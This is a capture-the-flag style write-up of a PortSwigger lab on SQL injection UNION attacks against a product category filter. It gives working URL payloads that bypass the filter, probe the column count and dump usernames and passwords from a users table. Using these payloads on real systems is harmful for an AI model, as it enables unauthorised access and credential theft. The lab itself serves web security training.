
# SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

---------------------------------------------

We see there are 2 values displayed in the table, the description and the content of the post:


<img width="1212" height="864" alt="1" src="https://github.com/user-attachments/assets/ccd84260-1bba-4ed6-8840-1e86f5ba599f" />



We find these payload are valid to display the 4 posts in Gifts and the second all the items:

```
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
```

<img width="1520" height="800" alt="2" src="https://github.com/user-attachments/assets/1a2d4ede-69c4-4f5e-b23a-a0f1f4ce6536" />



Also, that there are 2 columns returned by the query and we can do a UNION attack with:

```
/filter?category=Gifts'+union+all+select+NULL,NULL--
```


<img width="1522" height="807" alt="3" src="https://github.com/user-attachments/assets/62d7b008-c5a9-4d47-8a76-827e51846931" />



Knowing the table and database names we can retrieve the content from users using the payload:

```
/filter?category=Gifts'+union+all+select+username,password+from+users--
```


<img width="1539" height="793" alt="4" src="https://github.com/user-attachments/assets/17842b4f-45c5-4e63-bd2b-b78775a64462" />

